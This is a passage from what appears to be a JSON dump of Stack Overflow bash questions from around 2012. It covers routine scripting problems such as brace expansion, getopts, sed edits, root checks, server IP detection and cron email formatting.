chown root:wheel /Library/LaunchDaemons/com.sjusd.adbind.plist\nsudo chmod 755 /Library/LaunchDaemons/com.sjusd.adbind.plist\n\nexit 0\n</code></pre>\n\n<p>Dang tough crowd I got a minus 1 LOL</p>\n"},{"tags":["bash","brace-expansion"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12803263,"title":"bash's brace-expansion didn't work","body":"<p>i have a simple problem with bash's brace expansion:  </p>\n\n<pre><code>#!/bin/bash  \nPICS=\"{x1,x2,x3}.jpg {y1,y2}.png\"    \nfor i in $PICS  \ndo  \n  echo $i  \ndone\n</code></pre>\n\n<p>but the result is:<br>\n{x1,x2,x3}.jpg<br>\n{y1,y2}.png<br>\nBut i want the result is: x1.jpg x2.jpg x3.jpg y1.png y2.png<br>\nwhat should i do ?</p>\n"},{"tags":["bash","text","tar","cat","hp-ux"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":12802695,"title":"HP-UX - Read text file in tar archive without extract it","body":"<p>I have a TAR archive that contains several text files. I would like to write a script to display (stdout) the content of a file without extract it in the current directory.</p>\n\n<p>Actually I would like to do the same as:</p>\n\n<pre><code>tar tf myArchive.tar folder/someFile.txt\ncat folder/someFile.txt\nrm -R folder\n</code></pre>\n\n<p>but without the <code>rm</code>...</p>\n\n<p>I tried this way but it didn't work:</p>\n\n<pre><code>tar tf myArchive.tar folder/someFile.txt | cat\n</code></pre>\n\n<p>Thanks</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12799559,"title":"How do I kill a Bash script if it can't find or read a file?","body":"<p>I have written a small bash program which needs to read a file with name <code>input</code>. I want the script to print the message <code>file not found</code> and exit or kill itself if it can't find the file.</p>\n"},{"tags":["bash","ubuntu","sed","awk"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":76,"score":0,"question_id":12799047,"title":"Writing to /etc/networking/interfaces at boot using sed/awk?","body":"<p>Newbie here,</p>\n\n<p>I'm trying to write to an auto-generated <code>/etc/network/interfaces</code> file of a newely provisioned XEN Ubuntu (12.04/10.04/8.04) DomU server at boot time using (currently) <code>sed</code>.</p>\n\n<p>The auto-generated file is formatted as below:</p>\n\n<pre>\nauto eth0\niface eth0 inet static\n    address 192.168.0.88\n    gateway 192.168.0.254\n    network 255.255.255.255\nauto lo\niface lo inet loopback\n</pre>\n\n<p>Using <code>sed</code>, I'm trying to alter lines 1 &amp; 2, add a third line, remove the gateway and last two lines, and append four extra lines at the very end.</p>\n\n<p>I'm currently stuck on adding the third line, as the script adds this line everytime it's run:</p>\n\n<pre>\n#!/bin/bash\n\nsed -i \"1s/.*/auto lo eth0/\" /tmp/interfaces\nsed -i \"2s/.*/iface lo inet loopback/\" /tmp/interfaces\nsed -i \"2a\\iface eth0 inet static\" /tmp/interfaces\nsed -i \"s/auto lo//g\" /tmp/interfaces\n\n</pre>\n\n<p>Is it possible to add the third line only if it doesn't exist using <code>sed</code> (or <code>awk</code>)?</p>\n\n<p>Likewise, how can I delete the gateway and last two lines only if they don't exist?</p>\n\n<p>I'm new to <code>sed</code>, so am wondering whether I should be looking at <code>awk</code> instead for achieving this?</p>\n"},{"tags":["linux","git","bash","command-line","terminal"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12791251,"title":"Make bash commands to fall back to git commands if git command exists","body":"<p>Basically I want to type <code>show</code> and it checks if there is a <code>show</code> command or alias is defined and fire it and it is not defined fires <code>git show</code>.</p>\n\n<p>For example <code>rm</code> should do <code>rm</code> but <code>checkout</code> should do <code>git checkout</code>. </p>\n\n<p>Is it possible to program this in <code>bashrc</code>?</p>\n"},{"tags":["linux","bash"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":39,"score":2,"question_id":12798114,"title":"I specifically want to delete my grep output string from the text file","body":"<p>I'm a little bit new with Linux and I have a problem. \nI have a text file called <code>file_a.txt</code> My first \ncommand</p>\n\n<p><code>grep -A 12 \".production =\" file_a.txt</code> </p>\n\n<p>The output is a few block. Each block of string contains 13 rows</p>\n\n<p>I specifically want to delete all the block of strings I got with the <code>grep</code> \ncommand from the original file <code>file_a.txt</code> I do not want to send the grep \noutput to a new file. Also I do not want to to use <code>grep -v</code> because it will not work in my case.</p>\n\n<p>I have tried something like things like this, but nothing is working:</p>\n\n<p><code>cut &lt; grep -A 12 \".production =\" file_a.txt</code></p>\n\n<p><code>sed -i '/grep -A 12 \".production =\"/d' file_a.txt\n</code></p>\n"},{"tags":["linux","bash","date"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12797490,"title":"BASH: Set the date of the last Monday in a variable","body":"<pre><code>today=`date +%a`\n\nif [ \"$today\" == \"Mon\" ] \nthen\n        monday=`date -dmonday +%Y%m%d`\nelse\n        monday=`date -dlast-monday +%Y%m%d`\nfi\n</code></pre>\n\n<p>It's the best way to set the \"monday\" variable, the date of last monday?</p>\n"},{"tags":["bash","comments","multiline"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":807,"score":5,"question_id":9522631,"title":"Bash: How to Put Line Comment for a Multi-line Command","body":"<p>I know how to write a multi-line command in Bash script, but how can I add comment for each line in a Multi-line command?</p>\n\n<pre><code>CommandName InputFiles      \\ # This is the comment for the 1st line\n            --option1 arg1  \\ # This is the comment for the 2nd line\n            --option2 arg2    # This is the comment for the 3nd line\n</code></pre>\n\n<p>But unfortunately, the comment after continuation character <code>\\</code> will break the command.</p>\n\n<p>Any idea?  Thanks.</p>\n\n<p>Peter</p>\n"},{"tags":["bash","node.js","nginx","streaming","mp4"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12797437,"title":"Merging video chunks while streaming (on-the-fly)","body":"<p>The setup:</p>\n\n<ul>\n<li>Video chunks of 200M</li>\n<li>An nginx server with the mp4 streaming module to serve the video</li>\n</ul>\n\n<p>Is it possible to create a single mp4 file from the chunks, without interruptions to streaming them to the client?</p>\n\n<p>I've tried manually to <code>cat file_chunk &gt;&gt; test.mp4</code> with a limited success. It works on one occasion (using vlc to play the file while doing <code>cat ...</code>), and doesn't work in different cases (streaming through a browser, using totem media player...).</p>\n\n<p>Additionally, we are using Node.js for authentication and for the API in question (if that may somehow help).</p>\n\n<p>The relevant nginx configuration:</p>\n\n<pre><code> server {\n        listen 441;\n        ssl on;\n        ssl_certificate /etc/nginx/ssl/server.crt;\n                ssl_certificate_key /etc/nginx/ssl/server.key; \n        root /video/;\n\n        location *.mp4 {\n            mp4;\n            mp4_buffer_size 1m;\n            mp4_max_buffer_size 5m;\n        }\n    }    \n</code></pre>\n\n<p>Ideally, this could be somewhere in the lines of merging the chunks into a single file which is being streamed (without interruptions).</p>\n"},{"tags":["oracle","bash","sqlplus"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":119,"score":0,"question_id":12783579,"title":"Read file with multiple empty lines from ORACE DB with BASH","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/9931974/why-empty-line-is-not-getting-stored-in-variable\">why empty line is not getting stored in variable</a>  </p>\n</blockquote>\n\n\n\n<p>I try to read and output a textfile from my database. It works but empty lines will be deleted. </p>\n\n<p>EXAMPLE:</p>\n\n<pre><code>Hello Mr. X\n\nText from Mailboddy\n\nGreetins\nMr. Y\n</code></pre>\n\n<p>OUTPUT:</p>\n\n<pre><code>Hello Mr. X\nText from Mailboddy\nGreetins\nMr. Y\n</code></pre>\n\n<p>CODE:</p>\n\n<pre><code>sqlplus -s $DBLOGIN &lt;&lt;ENDE_SQL &gt; file\nSET FEEDBACK OFF;\nSET SERVEROUTPUT ON;\nDECLARE\n  l_text CLOB;\nBEGIN\n  SELECT text\n    INTO l_text\n    FROM table;  \n  while dbms_lob.substr(l_text, 1, l_pos) is not null LOOP\n    if dbms_lob.substr(l_text, 2, l_pos) = CHR(13) || CHR(10) then\n      DBMS_OUTPUT.NEW_LINE;\n      l_pos:=l_pos + 1;\n    else\n      DBMS_OUTPUT.put(dbms_lob.substr(l_text, 1, l_pos));\n    end if;\n    l_pos:=l_pos + 1;\n  END LOOP;\nEND;\n/\nENDE_SQL\n</code></pre>\n\n<p>The PL/SQL Code works in SQLDeveloper with the empty lines. But in the file all empty lines are removed.</p>\n"},{"tags":["bash","programming-languages","makefile","make"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":72,"score":2,"question_id":12794537,"title":"task based language alternative to Makefile","body":"<p>In <code>Makefile</code>'s I can define tasks so that a user can specify what s/he wants to do as:</p>\n\n<pre><code>make run\nmake serve\nmake deploy\n..\n</code></pre>\n\n<p>This seems to be working ok but I feel like <code>Makefile</code>'s are an overkill for this purpose with all those dependency analysis and relatively obscure syntax/execution. Are there any language/tool that is specifically designed for this purpose preferably available on most systems? or any idea how to use something like <code>bash</code> for this purpose?</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":12792212,"title":"Bash - Get the entire file name having space in it","body":"<p>I have a folder in which there are a few files:</p>\n\n<pre><code>a b.jpg\nc d.jpg\n</code></pre>\n\n<p>basically, I want to list the files and carry out some operations on them, however I failed to do by: </p>\n\n<p><code>for i in $( ls $folder ); do echo $i; done</code></p>\n\n<p>each line of output is a part of a file name rather than the entire one:</p>\n\n<pre><code>a\nb.jpg\nc\nd.jpg\n</code></pre>\n\n<p>How can I avoid this in Bash, </p>\n\n<p>Thanks,</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12786783,"title":"How to get the release value from an RPM -qi command","body":"<p>I'm on RedHat, I need to get the value in the Release field.\nTake \"wget\" for an example.</p>\n\n<p>Here's the output I'm expected to get</p>\n\n<pre><code>WGET:    1.4.el6\n</code></pre>\n\n<p>Here's the output from rpm -qi wget</p>\n\n<pre><code>[luke@machine ~]# rpm -qi wget\nName        : wget                         Relocations: (not relocatable)\nVersion     : 1.12                              Vendor: Red Hat, Inc.\nRelease     : 1.4.el6                       Build Date: Mon May 10 14:56:18 2010\nInstall Date: Wed Oct  3 16:48:58 2012         Build Host: x86-012.build.bos.redhat.com\nGroup       : Applications/Internet         Source RPM: wget-1.12-1.4.el6.src.rpm\nSize        : 1877597                          License: GPLv3+ and GFDL\nSignature   : RSA/8, Mon Aug 16 21:21:35 2010, Key ID 199e2f91fd431d51\nPackager    : Red Hat, Inc. &lt;http://bugzilla.redhat.com/bugzilla&gt;\nURL         : http://wget.sunsite.dk/\nSummary     : A utility for retrieving files using the HTTP or FTP protocols\n</code></pre>\n\n<p>How can I write a script to extract the \"1.4.el6\" from the Release field.</p>\n\n<p>I currently have</p>\n\n<pre><code>#!/bin/bash\nRELwg= rpm -qi wget\n# Do string manipulation of $RELwg here\nwg=\"WGET:   \"\necho $wg$RELwg\n</code></pre>\n\n<p>But here's the output I get;</p>\n\n<pre><code>Release     : 1.4.el6                       Build Date: Mon May 10 14:56:18 2010\nWGET:\n</code></pre>\n\n<p>I know I have to do some string extraction, to get the number.</p>\n\n<ul>\n<li>Get the index of the 1, seems to always be constant at 15</li>\n<li>Get the index of the B in Build Date</li>\n<li>Get the sub string inbetween 15 and whatever B is</li>\n</ul>\n\n<p>Removing the space between \"RELwg= rpm -qi wget\" in my current script, I just get an error saying that </p>\n\n<blockquote>\n  <p>./GetRPMVersions.sh: line 12: -qi: command not found</p>\n</blockquote>\n\n<p>Mainly my current predicament is to addign the ouput of rpm -qi wget | grep Release to a variable.</p>\n\n<p>Any input on the string manipulation is welcome.</p>\n"},{"tags":["git","bash","alias"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":236,"score":2,"question_id":8006190,"title":"How can I make this git command alias?","body":"<p>I want to make a alias, like this below </p>\n\n<p><code>gc this is a test message</code> convert to <code>git commit -m \"this is a test message\"</code>.</p>\n\n<p>How can I do this? I want that in my bashrc.</p>\n"},{"tags":["linux","bash","networking"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":12791608,"title":"\"Status\" field in /proc/net/wireless","body":"<p>I trying to check if any wireless interfaces are UP with a bash script. I think I can do this by checking the Status field in /proc/net/wireless for every interface. However, I tried to look for up reference to the possible values in that field and what they mean, and nothing seems to come up. Does anyone know? Is this the ideal way to approach this problem?</p>\n"},{"tags":["linux","bash","echo"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":97,"score":0,"question_id":11773835,"title":"^M char creates extra new lines when using echo | mail","body":"<p>I have a file that look like this:</p>\n\n<pre><code>&gt; cat my.txt\nThis is sentence 1.\nThis is sentence 2.\n&lt;empty line&gt;\nThis is sentence 3.\n</code></pre>\n\n<p>In my bash script, when I add try to email the file, an extra line appears.  </p>\n\n<pre><code>#!/bin/bash\noutf=\"/tmp/my.txt\"\naction=`cat $outf`\necho $action | mail -s \"my test\" emailid@mail.com\n</code></pre>\n\n<p>This is how the email looks like:</p>\n\n<pre><code>This is sentence 1.\n&lt;empty line&gt;\nThis is sentence 2.\n&lt;empty line&gt;\n&lt;empty line&gt;\nThis is sentence 3.\n&lt;empty line&gt;\n</code></pre>\n\n<p>How do I remove the extra empty lines?</p>\n"},{"tags":["regex","perl","bash","sed","awk"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":103,"score":0,"question_id":12779134,"title":"Parsing .ssh/config for proxy information","body":"<p>I would like to parse the <code>.ssh/config</code> file for proxy information contained therein and display each host that has related proxy information with the proxy information. Hosts that do not have any proxy information should be filtered out. Man page for <code>.ssh/config</code>: <a href=\"http://man-wiki.net/index.php/5:ssh_config\" rel=\"nofollow\">http://man-wiki.net/index.php/5:ssh_config</a></p>\n\n<p>This should be done from a Unix shell script under Bash, so a standard tool like Perl, awk or sed is preferred.</p>\n\n<p>Example input file:</p>\n\n<pre><code>Host ssh.foo.com\n    User ssh\n    HostName ssh.foo.com\n    Port 443\n    ProxyCommand /usr/local/bin/corkscrew proxy 8080 %h %p ~/.ssh/proxyauth\n\nHost ci\n    HostName 127.0.0.2\n    User ci\n\nHost nightly\n    HostName 192.168.1.1\n    User goodnight\n\nHost foobar.org\n    User git\n    HostName foobar.org\n    Port 443\n    ProxyCommand /usr/local/bin/corkscrew proxy 8080 %h %p ~/.ssh/proxyauth\n\nHost integration\n    HostName 192.168.1.2\n    User int\n</code></pre>\n\n<p>The expected output should look like this:</p>\n\n<pre><code>Host: ssh.foo.com - Proxy: /usr/local/bin/corkscrew proxy 8080 %h %p ~/.ssh/proxyauth\nHost: foobar.org - Proxy: /usr/local/bin/corkscrew proxy 8080 %h %p ~/.ssh/proxyauth\n</code></pre>\n\n<p>The difficulty here is that the search has to cover multiple lines.</p>\n"},{"tags":["linux","bash","centos"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":676,"score":0,"question_id":5732696,"title":"CentOS directory structure as tree?","body":"<p>Is there an equivalent to tree on CentOS?</p>\n"},{"tags":["bash","shell","getopt","getopt-long","getopts"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12789828,"title":"working with options in bash code","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/402377/using-getopts-in-bash-shell-script-to-get-long-and-short-command-line-options\">Using getopts in bash shell script to get long and short command line options</a>  </p>\n</blockquote>\n\n\n\n<p>I'm trying to figure out how to make use of flag like -e/--email -h/--help for example.</p>\n\n<p><strong>UPDATE:</strong>\nCurrent example:</p>\n\n<pre><code>while getopts \":ec:h\" OptionArgument; do\ncase $OptionArgument in\n\n        e ) S1=${OPTARG};;\n        c ) S2=${OPTARG};;\n        h ) usage;;\n        \\?) usage;;\n        * ) usage;;\nesac\ndone\n</code></pre>\n\n<p>However, if I leave blank it does nothing. If I add an -h it still runs and will not show usage.</p>\n\n<p><strong>UPDATE2</strong></p>\n\n<pre><code>while [ $1 ]; do\n        case $1 in\n                '-h' | '--help' | '?' )\n                        usage\n                        exit\n                        ;;\n                '--conf' | '-c' )\n\n                        ;;\n                '--email' | '-e' )\n                        EMAIL=$1\n                        ;;\n                * )\n                        usage\n                        exit\n                        ;;\n        esac\n        shift\ndone\n</code></pre>\n\n<p>-h/--help works but everything else fails and displays usage.</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12791051,"title":"Passing for loop results to VAR fails","body":"<p>I am counting the number of files contained in a directory where ZIPs are dropped</p>\n\n<p>When I run this to <code>echo $VAR</code> later on to an email</p>\n\n<pre><code> VAR=`for i in `find . -mtime 0 -name '*XML*' -exec ls '{}' \\;`; do unzip -l \"$i\"| awk -F. '{if ($2==\"XML\") print $0}'|wc -l; done| paste -sd+ | bc`\n</code></pre>\n\n<p>it fails with this error:</p>\n\n<pre><code>-bash: command substitution: line 1: syntax error near unexpected token `;'\n-bash: command substitution: line 1: `; do unzip -l \"$i\"| awk -F. '{if ($2==\"XML\") print $0}'|wc -l; done| paste -sd+ | bc'\n-bash: command substitution: line 2: syntax error: unexpected end of file\n-bash: .: -m: invalid option\n.: usage: . filename [arguments]\n</code></pre>\n\n<p>By itself, the <code>for</code> loop runs fine. </p>\n\n<p>It seems that I am missing something re: escaping quotes. Any idea?</p>\n"},{"tags":["osx","bash","sudo"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":12790213,"title":"Sudo not prompting for password Mac bash script","body":"<p>I am trying to write a script that appends a line to the /etc/hosts, which means I need sudoer privileges.  However, if I run the script from the desktop it does not prompt for a password.  I simply get permission denied.</p>\n\n<p>Example script:</p>\n\n<pre><code>#!/bin/bash\nsudo echo '131.253.13.32        www.google.com' &gt;&gt; /etc/hosts\ndscacheutil -flushcache\n</code></pre>\n\n<p>A terminal pops up and says permission denied, but never actually prompts for the sudo password.  Is there a way to fix this?</p>\n"},{"tags":["bash","cron"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12790062,"title":"E-mail from cron missing newlines from script output, why?","body":"<p>I have a crontab which executes a shell script and if there is output I expect to see the output in my e-mail:</p>\n\n<p>Here is what the crontab entry looks like:</p>\n\n<pre><code>*/2 * * * * /bin/check_perms.sh\n</code></pre>\n\n<p>The actual script looks like:</p>\n\n<pre><code>#!/bin/bash\ndeclare -a fix_dirs\n\nfix_dirs=(`cat $(dirname $0)/dirs_to_fix.txt`)\n\nfor dir in \"${fix_dirs[@]}\"; do\n   find $dir -type d ! -perm -go=xw -exec stat -c '%U %n %A' {} +\n   find $dir -type f ! -perm -go=w -exec stat -c '%U %n %A' {} +\ndone\n</code></pre>\n\n<p>I am guessing the output of the find is the problem, but if I redirect to a file the file has newlines. When I get the email from cron it is missing all the newlines between files returned by find.</p>\n\n<p>UPDATE: It was just a mail client \"issue\" I found a way to disable Outlook's behavior here: <a href=\"http://support.microsoft.com/kb/287816\" rel=\"nofollow\">http://support.microsoft.com/kb/287816</a></p>\n"},{"tags":["bash"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":45,"score":3,"question_id":12789714,"title":"Get parts of string then update it","body":"<p>I have this string</p>\n\n<pre><code>blah --arg1 --arg2 --etc doh\n</code></pre>\n\n<p>sometimes <code>doh</code> ending in slash, sometimes not. </p>\n\n<p>i need to extract <code>doh</code> and assign to a var.</p>\n\n<p>then replace it with <code>/some/path/doh</code></p>\n\n<p>I wont put here my tries, they are way too ugly.</p>\n\n<p>--- updated ---</p>\n\n<p>mm, not sure i understand the answers, sorry.</p>\n\n<p>the final string should be like:</p>\n\n<pre><code>blah --arg1 --arg2 --etc /some/path/doh\n</code></pre>\n\n<p>and <code>doh</code> assigned to a var, say <code>foo</code></p>\n"},{"tags":["bash","shell","unix","ssh"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12789627,"title":"Running local script remotely with shell script here documents","body":"<p>I need to run a script remotely. I am using the following shell script</p>\n\n<pre><code>    for server in $servers\n     do\n     LOCAL_VAR=&lt;some_value&gt;\n     ssh $server &lt;&lt;EOF\n      command1 $LOCAL_VAR\n      command2..\n      ..\n      exit\n      EOF\n    done\n</code></pre>\n\n<p>bash shows unexpected end of file syntax error. The rest of the code works fine if I remove this block. Can you please tell me the correct way of executing a script remotely.</p>\n"},{"tags":["linux","bash","shell","awk","grep"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":12788607,"title":"Using bash to check if server is dedicated or a VPS","body":"<p>GOAL: \nPull the IP address from the server. However, the issue comes into play that dedicated and VPS are very different. What is the best or most ideal way to pull and do a check and print the IP Address?</p>\n\n<p>I guess I could do a check with the following?</p>\n\n<pre><code>root@host]# /sbin/ifconfig venet0:0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'\nIP IS HERE\nroot@host]# /sbin/ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'\neth0: error fetching interface information: Device not found\n</code></pre>\n"},{"tags":["bash","eval","substitution","quote"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":59,"score":2,"question_id":12789079,"title":"Bash eval replacement $() not always equivalent?","body":"<p>Everybody says eval is evil, and you should use $() as a replacement.  But I've run into a situation where the <em>unquoting</em> isn't handled the same inside $().</p>\n\n<p>Background is that I've been burned too often by file paths with spaces in them, and so like to quote all such paths.  More paranoia about wanting to know where all my executables are coming from.  Even more paranoid, not trusting myself, and so like being able to display the created commands I'm about to run.</p>\n\n<p>Below I try variations on using eval vs. $(), and whether the command name is quoted (cuz it <em>could</em> contain spaces)</p>\n\n<pre><code>  BIN_LS=\"/bin/ls\"\n  thefile=\"arf\"\n  thecmd=\"\\\"${BIN_LS}\\\" -ld -- \\\"${thefile}\\\"\"\n\n  echo -e \"\\n    Running command   '${thecmd}'\"\n  $($thecmd)\n\n          Running command   '\"/bin/ls\" -ld -- \"arf\"'\n      ./foo.sh: line 8: \"/bin/ls\": No such file or directory\n\n  echo -e \"\\n    Eval'ing command  '${thecmd}'\"\n  eval $thecmd\n\n          Eval'ing command  '\"/bin/ls\" -ld -- \"arf\"'\n      /bin/ls: cannot access arf: No such file or directory\n\n  thecmd=\"${BIN_LS} -ld -- \\\"${thefile}\\\"\"\n\n  echo -e \"\\n    Running command   '${thecmd}'\"\n  $($thecmd)\n\n          Running command   '/bin/ls -ld -- \"arf\"'\n      /bin/ls: cannot access \"arf\": No such file or directory\n\n  echo -e \"\\n    Eval'ing command  '${thecmd}'\"\n  eval $thecmd\n\n          Eval'ing command  '/bin/ls -ld -- \"arf\"'\n      /bin/ls: cannot access arf: No such file or directory\n\n  $(\"/bin/ls\" -ld -- \"${thefile}\")\n\n      /bin/ls: cannot access arf: No such file or directory\n</code></pre>\n\n<p>So... this is confusing.  A quoted command path is valid everywhere except inside a $() construct?  A shorter, more direct example:</p>\n\n<pre><code>$ c=\"\\\"/bin/ls\\\" arf\"\n$ $($c)\n-bash: \"/bin/ls\": No such file or directory\n$ eval $c\n/bin/ls: cannot access arf: No such file or directory\n$ $(\"/bin/ls\" arf)\n/bin/ls: cannot access arf: No such file or directory\n$ \"/bin/ls\" arf\n/bin/ls: cannot access arf: No such file or directory\n</code></pre>\n\n<p>How does one explain the simple  <code>$($c)</code>  case?</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":4,"view_count":41,"score":-4,"question_id":12789220,"title":"in Bash，How to check user login","body":"<p>If use bash script how to record the number of logged in users every 5 minutes.  Each measurement needs to be appended to a text file.  There should be one line of text for each measurement, formatted as follows.</p>\n\n<p>Fri Oct 11 13:12:04 EDT 2011 8 users</p>\n"},{"tags":["linux","bash","ssh","profile","last"],"answer_count":5,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":63,"score":4,"question_id":12788199,"title":"Perform action when user logs in via SSH from a particular host","body":"<p>I have a quesiton that puzzles me and I wonder if anyone has attempted to achieve the following:</p>\n\n<p>Let's assume that this is the result of my 'last' command in a Linux environment:</p>\n\n<pre><code>root  pts/1        192.168.1.10      Wed Feb 10 07:04 - 07:57  (00:52)  \nroot  pts/2                          Tue Feb  9 22:00 - 00:13  (02:13)   \n</code></pre>\n\n<p>How can I setup a particular action (say for example a modified MOTD or sending an email) if the the 'root' user has logged in from 192.168.1.10. Is there a way of capturing this information?</p>\n\n<p>The second part of this question is that how can I make the above check a bit more robust - i.e. if I have the following:</p>\n\n<pre><code>mary  pts/1        192.168.1.10      Wed Feb 10 07:04 - 07:57  (00:52)  \nbob   pts/2                          Tue Feb  9 22:00 - 00:13  (02:13)      \n</code></pre>\n\n<p>Now I'd like to perform an action if the username is equal to 'mary' and the host is 192.168.1.10.</p>\n\n<p>Any suggestions are welcomed.</p>\n\n<p>Thank you in advance.</p>\n"},{"tags":["linux","bash","shell","echo"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12789131,"title":"Bash script not saving/getting value","body":"<pre><code>    CHECK_servervirt()\n    {\n    if [ -f /proc/xen ] ; then\n            $BIN_ECHO -e \" Server is XEN \"\n            SERVERVIRT=\"xen\";\n            SERVERIP=$(/sbin/ifconfig venet0:0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}');\n    elif [ -f /proc/vz ] ; then\n            $BIN_ECHO -e \" Server is OpenVZ \"\n            SERVERVIRT=\"openvz\";\n            SERVERIP=$(/sbin/ifconfig venet0:0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}');\n    else\n            $BIN_ECHO -e \" Server is full dedicated \"\n            SERVERVIRT=\"dedicated\";\n            SERVERIP=$(/sbin/ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}');\n    fi\n    }\n$BIN_ECHO -e \" Server name: $SERVERNAME \"\n$BIN_ECHO -e \" Server IP: $SERVERIP \"\n</code></pre>\n\n<p>However, the server IP comes out blank. But the system see's it has a full dedicated and I can print it out.</p>\n\n<pre><code>/sbin/ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'\n192.168.233.129\n</code></pre>\n"},{"tags":["linux","bash","shell","syntax"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":12788296,"title":"syntax error near unexpected token","body":"<pre><code>./csf_install.sh: line 30: syntax error near unexpected token `CHECK_distro'\n./csf_install.sh: line 30: `CHECK_distro()'\n</code></pre>\n\n<p>My code:</p>\n\n<pre><code>    if [ \"$(whoami &amp;2&gt;/dev/null)\" != \"root\" ] &amp;&amp; [ \"$(id -un &amp;2&gt;/dev/null)\" != \"root\" ] ; then\n        $BIN_ECHO \" must be root to run this script \"\n        exit 1\n    else\n        $BIN_ECHO -e \" permission check passed \"\n    fi\n    CHECK_architecture()\n    CHECK_distro()\n...\nCHECK_architecture()\n{\n    architecture=`uname -m`\n    if [ \"$architecture\" != \"x86_64\" ] &amp;&amp; [ \"$architecture\" != \"ia64\" ]; then\n        architecture=\"x86\"\n    else\n        architecture=\"x86_64\"\n    fi\n}\n\nCHECK_distro()\n{\n    DISTRO=\"\";\n    if [ `uname -r | egrep '(6.2-RELEASE|6.1-RELEASE|5.5-RELEASE|6.1-STABLE|5.4-RELEASE|6.0-RELEASE|5.3-RELEASE|4.10-RELEASE|4.11-RELEASE)'` ]; then\n        DISTRO=\"FreeBSD\";\n        $BIN_ECHO \" System is running FreeBSD\"\n    elif [ -f /etc/debian_version ];  then\n           $BIN_ECHO \" System is running Debian Linux\"\n           DISTRO=DEBIAN;\n    elif [ -f /etc/SuSE-release ]; then\n           $BIN_ECHO \" System is running SuSE Linux\"\n           DISTRO=SUSE;\n    elif [ -f /etc/fedora-release ]; then\n           $BIN_ECHO \" System is running Fedora Linux\"\n           DISTRO=FEDORA;\n    elif [ -f /etc/redhat-release ]; then\n           $BIN_ECHO \" System is running Red Hat Linux\"\n           DISTRO=REDHAT;\n    else\n        $BIN_ECHO -e \" no supported distribution found running \"\n    exit 1\nfi\n}\n</code></pre>\n\n<p>Is it that my check code is wrong? Or is it how I am doing my functions? Do the functions need to come first?</p>\n\n<p>ALSO</p>\n\n<p>Is there a better way to check and set distribution of operating systems?</p>\n"},{"tags":["linux","bash","shell","user"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":238,"score":1,"question_id":12787998,"title":"Script fails to see running as root","body":"<p>This is my root check code. If does not pass don't run the script as you need root. Not sure as to what is going wrong here:</p>\n\n<pre><code>if [ \"whoami &amp;2&gt;/dev/null\" != \"root\" ] &amp;&amp; [ \"id -un &amp;2&gt;/dev/null\" != \"root\" ] ; then\n    $BIN_ECHO \" must be root to run this script \"\n    exit 1\nelse\n    $BIN_ECHO -e \" permission check passed \"\nfi\n</code></pre>\n\n<p>after running i get:</p>\n\n<pre><code>must be root to run this script\n[root@localhost ~]# whoami\nroot\n[root@localhost ~]# id 